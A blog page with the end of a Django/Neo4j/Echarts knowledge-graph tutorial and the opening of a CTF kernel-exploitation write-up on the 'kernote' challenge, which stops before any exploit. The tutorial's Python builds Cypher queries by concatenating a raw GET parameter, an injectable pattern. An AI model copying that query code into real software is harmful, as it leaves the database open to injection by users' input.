<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r&#x27;^$&#x27;</span>, base_views.index),</span><br><span class="line">    url(<span class="string">r&#x27;^detail&#x27;</span>, detail_views.searchDetail),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>这种做法其实就是把 Neo4j 当成了 Django 项目中的一个子模块</p>
<p><strong>Echarts 实现知识图谱可视化</strong></p>
<p>Echarts 是用 JavaScript 实现的开源可视化库</p>
<p>学习这个东西可花了我不少的力气，效果如下：</p>
<img src="/2023/03/05/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%BA%8C/1677999130528.png" class width="1677999130528"> 
<p>我实现的思路就是直接在 urls.py 中添加用于实现功能的函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r&#x27;^$&#x27;</span>, base_views.index),</span><br><span class="line">    url(<span class="string">r&#x27;^detail&#x27;</span>, detail_views.searchDetail),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">searchDetail</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (request.GET):</span><br><span class="line">        entity = request.GET[<span class="string">&#x27;user_text&#x27;</span>]</span><br><span class="line">        db = Neo4j()</span><br><span class="line">        db.connectDB()</span><br><span class="line"></span><br><span class="line">        game = db.name2game(entity)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(game) == <span class="number">0</span>:</span><br><span class="line">            ctx = &#123;<span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;ctx&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&#x27;detail.html&#x27;</span>, &#123;<span class="string">&#x27;ctx&#x27;</span>: json.dumps(ctx, ensure_ascii=<span class="literal">False</span>)&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            author = db.game2author(entity)</span><br><span class="line">            classify = db.game2classify(entity)</span><br><span class="line">            label = db.game2label(entity)</span><br><span class="line">            entityRelation = [game, author, classify, label]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&#x27;detail.html&#x27;</span>, &#123;<span class="string">&#x27;entityRelation&#x27;</span>: json.dumps(entityRelation, ensure_ascii=<span class="literal">False</span>)&#125;)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;detail.html&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>识别 URL 中的 <code>user_text</code> 并调用对应的函数（简单转换为 Cypher 语句）</li>
<li>在 Neo4j 中查找数据，将返回的数据提交给 JavaScript 层</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name2game</span>(<span class="params">self,value</span>):</span></span><br><span class="line">	sql = <span class="string">&quot;MATCH (n:游戏名称&#123;名称:&#x27;&quot;</span>+<span class="built_in">str</span>(value)+<span class="string">&quot;&#x27;&#125;) return n;&quot;</span></span><br><span class="line">	answer = self.graph.run(sql).data()</span><br><span class="line">	<span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game2author</span>(<span class="params">self,value</span>):</span></span><br><span class="line">	sql = <span class="string">&quot;MATCH(a)-[r:制作]-&gt;(b) where b.名称 = &#x27;&quot;</span>+<span class="built_in">str</span>(value)+<span class="string">&quot;&#x27; RETURN a;&quot;</span></span><br><span class="line">	answer = self.graph.run(sql).data()</span><br><span class="line">	<span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game2classify</span>(<span class="params">self,value</span>):</span></span><br><span class="line">	sql = <span class="string">&quot;MATCH(a)-[r:类型]-&gt;(b) where b.名称 = &#x27;&quot;</span>+<span class="built_in">str</span>(value)+<span class="string">&quot;&#x27; RETURN a;&quot;</span></span><br><span class="line">	answer = self.graph.run(sql).data()</span><br><span class="line">	<span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game2label</span>(<span class="params">self,value</span>):</span></span><br><span class="line">	sql = <span class="string">&quot;MATCH(a)-[r:标签]-&gt;(b) where b.名称 = &#x27;&quot;</span>+<span class="built_in">str</span>(value)+<span class="string">&quot;&#x27; RETURN a;&quot;</span></span><br><span class="line">	answer = self.graph.run(sql).data()</span><br><span class="line">	<span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure>
<ul>
<li>在 JavaScript 层中识别 Django 层函数返回的数据，简单处理后交给 Echarts：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ctx %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">style</span>=<span class="string">&quot;background-color:rgba(0,0,0,0.6); font:26px 宋体; color:white;&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">style</span>=<span class="string">&quot;region:none&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;18&quot;</span> <span class="attr">style</span>=<span class="string">&quot;region:none&quot;</span> &gt;</span>数据库中暂未添加该实体<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">&#123;% elif entityRelation %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:700px;height:600px&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> ctx = [ &#123;&#123; ctx|safe &#125;&#125; ] ;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> entityRelation = [ &#123;&#123; entityRelation|safe &#125;&#125; ] ;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> data = [] ;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> links = [] ;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> game = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> author = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> author_link = &#123;&#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> classify = &#123;&#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> classify_link = &#123;&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(entityRelation)</span></span><br><span class="line"><span class="javascript">    game[<span class="string">&#x27;name&#x27;</span>] = entityRelation[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>][<span class="string">&#x27;n&#x27;</span>][<span class="string">&#x27;名称&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    game[<span class="string">&#x27;category&#x27;</span>] = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">    game[<span class="string">&#x27;symbolSize&#x27;</span>] = <span class="number">80</span>;</span></span><br><span class="line"><span class="javascript">    data.push(game);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    classify[<span class="string">&#x27;name&#x27;</span>] = entityRelation[<span class="number">0</span>][<span class="number">2</span>][<span class="number">0</span>][<span class="string">&#x27;a&#x27;</span>][<span class="string">&#x27;类型&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    classify[<span class="string">&#x27;category&#x27;</span>] = <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">    classify[<span class="string">&#x27;symbolSize&#x27;</span>] = <span class="number">60</span>;</span></span><br><span class="line"><span class="javascript">    classify_link[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;类型&quot;</span>;</span></span><br><span class="line"><span class="javascript">    classify_link[<span class="string">&#x27;target&#x27;</span>] = classify[<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    classify_link[<span class="string">&#x27;source&#x27;</span>] =  game[<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    data.push(classify);</span></span><br><span class="line"><span class="javascript">    links.push(classify_link)</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    author[<span class="string">&#x27;name&#x27;</span>] = entityRelation[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;a&#x27;</span>][<span class="string">&#x27;名称&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    author[<span class="string">&#x27;category&#x27;</span>] = <span class="number">2</span>;</span></span><br><span class="line"><span class="javascript">    author[<span class="string">&#x27;symbolSize&#x27;</span>] = <span class="number">60</span>;</span></span><br><span class="line"><span class="javascript">    author_link[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;作者&quot;</span>;</span></span><br><span class="line"><span class="javascript">    author_link[<span class="string">&#x27;target&#x27;</span>] = author[<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    author_link[<span class="string">&#x27;source&#x27;</span>] =  game[<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    data.push(author);</span></span><br><span class="line"><span class="javascript">    links.push(author_link)</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>( <span class="keyword">var</span> i = <span class="number">0</span> ;i &lt; entityRelation[<span class="number">0</span>][<span class="number">3</span>].length ; i++ ) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> label = &#123;&#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> label_link = &#123;&#125;</span></span><br><span class="line"><span class="javascript">        label[<span class="string">&#x27;name&#x27;</span>] = entityRelation[<span class="number">0</span>][<span class="number">3</span>][i][<span class="string">&#x27;a&#x27;</span>][<span class="string">&#x27;标签&#x27;</span>];</span></span><br><span class="line"><span class="javascript">        label[<span class="string">&#x27;category&#x27;</span>] = <span class="number">3</span>;</span></span><br><span class="line"><span class="javascript">        label[<span class="string">&#x27;symbolSize&#x27;</span>] = <span class="number">50</span>;</span></span><br><span class="line"><span class="javascript">        label_link[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;标签&quot;</span>;</span></span><br><span class="line"><span class="javascript">        label_link[<span class="string">&#x27;target&#x27;</span>] = label[<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="javascript">        label_link[<span class="string">&#x27;source&#x27;</span>] =  game[<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="javascript">        data.push(label);</span></span><br><span class="line"><span class="javascript">        links.push(label_link);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> myChart = echarts.init(<span class="built_in">document</span>.getElementById(<span class="string">&#x27;main&#x27;</span>));</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> categories = [</span></span><br><span class="line"><span class="javascript">        &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">name</span>: <span class="string">&#x27;游戏&#x27;</span></span></span><br><span class="line"><span class="javascript">        &#125;, &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">name</span>: <span class="string">&#x27;类型&#x27;</span></span></span><br><span class="line"><span class="javascript">        &#125;, &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">name</span>: <span class="string">&#x27;作者&#x27;</span></span></span><br><span class="line"><span class="javascript">        &#125;, &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">name</span>: <span class="string">&#x27;标签&#x27;</span></span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">    ];</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    option = &#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">title</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">text</span>: <span class="string">&#x27;ECharts 关系图&#x27;</span></span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">tooltip</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">formatter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> x.data.des;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">toolbox</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">show</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">feature</span>: &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">mark</span>: &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">show</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">                &#125;,</span></span><br><span class="line"><span class="javascript">                <span class="attr">restore</span>: &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">show</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">                &#125;,</span></span><br><span class="line"><span class="javascript">                <span class="attr">saveAsImage</span>: &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">show</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">legend</span>: [&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">data</span>: categories.map(<span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> a.name;</span></span><br><span class="line"><span class="javascript">            &#125;)</span></span><br><span class="line"><span class="javascript">        &#125;],</span></span><br><span class="line"><span class="javascript">        <span class="attr">series</span>: [&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">type</span>: <span class="string">&#x27;graph&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">layout</span>: <span class="string">&#x27;force&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">symbolSize</span>: <span class="number">40</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">roam</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">edgeSymbol</span>: [<span class="string">&#x27;circle&#x27;</span>, <span class="string">&#x27;arrow&#x27;</span>],</span></span><br><span class="line"><span class="javascript">            <span class="attr">edgeSymbolSize</span>: [<span class="number">2</span>, <span class="number">10</span>],</span></span><br><span class="line"><span class="javascript">            <span class="attr">edgeLabel</span>: &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">normal</span>: &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">textStyle</span>: &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="attr">fontSize</span>: <span class="number">20</span></span></span><br><span class="line"><span class="javascript">                    &#125;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">force</span>: &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">repulsion</span>: <span class="number">2500</span>,</span></span><br><span class="line"><span class="javascript">                <span class="attr">edgeLength</span>: [<span class="number">10</span>, <span class="number">50</span>]</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">draggable</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">lineStyle</span>: &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">normal</span>: &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">width</span>: <span class="number">2</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">color</span>: <span class="string">&#x27;#4b565b&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">edgeLabel</span>: &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">normal</span>: &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">show</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">formatter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> x.data.name;</span></span><br><span class="line"><span class="javascript">                    &#125;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">label</span>: &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">normal</span>: &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">show</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">textStyle</span>: &#123;&#125;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">data</span>: data,</span></span><br><span class="line"><span class="javascript">            <span class="attr">links</span>: links,</span></span><br><span class="line"><span class="javascript">            <span class="attr">categories</span>: categories,</span></span><br><span class="line"><span class="javascript">        &#125;]</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    myChart.setOption(option);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">style</span>=<span class="string">&quot;background-color:rgba(0,0,0,0.6); font:26px 宋体; color:white;&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">style</span>=<span class="string">&quot;region:none&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;18&quot;</span> <span class="attr">style</span>=<span class="string">&quot;region:none&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>从 <code>var myChart = echarts.init</code> 到 <code>myChart.setOption(option)</code> 都是 Echarts 的模板</li>
<li>如果对 Django 层返回的数据不熟悉，可以直接用 <code>console.log(entityRelation)</code> 把该数据输出到控制台，并打开 F12 进行查看</li>
</ul>
<img src="/2023/03/05/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%BA%8C/1678000302203.png" class width="1678000302203"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/02/ldt_struct+modify_ldt+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/02/ldt_struct+modify_ldt+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="post-title-link" itemprop="url">ldt_struct+modify_ldt+条件竞争</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-02 17:23:22 / Modified: 17:27:36" itemprop="dateCreated datePublished" datetime="2023-03-02T17:23:22+08:00">2023-03-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>kernote 复现</strong></p>
<p>该题目的文件系统是 <code>ext4</code>（不是常规 kernel pwn 使用的 <code>ramfs</code>），我们可以使用 <code>mount</code> 命令将其挂载以查看并修改其内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir rootfs</span><br><span class="line">sudo mount rootfs.img /home/yhellow/桌面/TCTF2021-FINAL-kernote/rootfs/</span><br></pre></td></tr></table></figure>
<p>读取信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version <span class="number">5.11</span><span class="number">.9</span> (yzloser@yzloser-rubbish) #<span class="number">2</span> SMP Wed Sep <span class="number">22</span> <span class="number">23</span>:<span class="number">03</span>:<span class="number">52</span> CST <span class="number">2021</span>, RO-rootFS, swap_dev <span class="number">0x9</span>, Normal VGA</span><br></pre></td></tr></table></figure>
<ul>
<li>version 5.11.9 </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-hda ./rootfs.img \</span><br><span class="line">-append &quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot; \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=2 \</span><br><span class="line">-nographic \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-no-reboot \</span><br><span class="line">-snapshot</span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap，kaslr，KPTI</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="meta">#</span><span class="bash">mount -t devtmpfs devtmpfs /dev</span></span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">echo /sbin/mdev&gt;/proc/sys/kernel/hotplug</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo &quot;flag&#123;testflag&#125;&quot;&gt;/flag</span><br><span class="line">chmod 660 /flag</span><br><span class="line">insmod /kernote.ko</span><br><span class="line"><span class="meta">#</span><span class="bash">/sbin/mdev -s</span></span><br><span class="line">chmod 666 /dev/kernote</span><br><span class="line">chmod 777 /tmp</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/proc/sys/kernel/dmesg_restrict</code></li>
<li><code>/proc/sys/kernel/kptr_restrict</code></li>
</ul>
<p><strong>漏洞分析</strong></p>
